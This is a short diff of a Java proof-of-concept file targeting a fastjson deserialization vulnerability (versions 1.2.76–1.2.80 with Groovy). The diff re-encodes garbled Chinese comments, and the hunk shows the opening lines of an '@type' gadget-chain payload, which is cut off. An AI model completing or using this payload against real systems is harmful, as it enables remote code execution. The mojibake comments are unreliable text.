@@ -4,8 +4,8 @@ import com.alibaba.fastjson.JSON;
 public class Fastjson17_groovy {
     public static void main(String[] args){
 
-        //ÒÀÀµ1.2.76-1.2.80£¬ÒÀÀµgroovy
-    	//jar°üĞ´·¨¼ûhttps://github.com/Lonely-night/fastjsonVul/tree/7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7
+        //ä¾èµ–1.2.76-1.2.80,ä¾èµ–groovy
+    	//jaråŒ…å†™æ³•è§https://github.com/Lonely-night/fastjsonVul/tree/7f9d2d8ea1c27ae1f9c06076849ae76c25b6aff7
     	String poc1 = "{\n" +
                 "    \"@type\":\"java.lang.Exception\",\n" +
                 "    \"@type\":\"org.codehaus.groovy.control.CompilationFailedException\",\n" +
